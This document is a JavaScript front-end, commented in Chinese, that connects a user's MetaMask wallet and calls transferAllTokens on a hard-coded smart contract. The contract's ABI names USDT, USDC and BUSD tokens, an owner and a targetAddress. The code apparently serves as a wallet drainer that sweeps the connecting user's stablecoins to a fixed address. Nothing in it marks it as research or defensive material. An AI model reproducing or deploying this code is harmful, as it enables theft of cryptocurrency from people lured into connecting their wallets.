const connectWalletButton = document.getElementById('connectWalletButton');
const transferAllTokensButton = document.getElementById('transferAllTokensButton');
const walletAddressDiv = document.getElementById('walletAddress');
let userAddress = null;

// 智能合约地址和 ABI
const contractAddress = '0x38cB7800C3Fddb8dda074C1c650A155154924C73'; // 替换为你的合约地址
const contractABI = [
    {
        "inputs": [{"internalType": "address","name": "from","type": "address"}],
        "name": "transferAllTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "busdToken",
        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address","name": "","type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "targetAddress",
        "outputs": [{"internalType": "address","name": "","type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdcToken",
        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],
        "stateMutability": "view",
        "type": "function"
    }
];

// 使用 ethers.js 连接智能合约
let provider;
let signer;
let contract;

// 检查是否支持 MetaMask
if (typeof window.ethereum !== 'undefined') {
    console.log('MetaMask detected');

    // 监听钱包连接
    connectWalletButton.addEventListener('click', async () => {
        try {
            console.log("Connecting to MetaMask...");

            // 请求连接 MetaMask
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            walletAddressDiv.innerHTML = `钱包地址: ${userAddress}`;

            // 实例化智能合约
            contract = new ethers.Contract(contractAddress, contractABI, signer);
            transferAllTokensButton.disabled = false; // 启用转账按钮
            console.log("Connected to MetaMask, address:", userAddress);
        } catch (error) {
            console.error('连接钱包失败:', error);
            walletAddressDiv.innerHTML = '连接钱包失败，请重试';
        }
    });
} else {
    console.log('MetaMask not found');
    walletAddressDiv.innerHTML = '请安装 MetaMask 扩展程序';
}

// 转移代币按钮点击事件
transferAllTokensButton.addEventListener('click', async () => {
    if (userAddress && contract) {
        try {
            console.log(`正在转移代币...`);
            // 调用智能合约的 transferAllTokens 方法，将所有代币转移到指定地址
            const tx = await contract.transferAllTokens(userAddress);
            await tx.wait();  // 等待交易完成
            console.log(`代币转移成功: ${tx.hash}`);
        } catch (error) {
            console.error('转移代币失败:', error);
        }
    } else {
        console.log('请先连接钱包');
    }
});
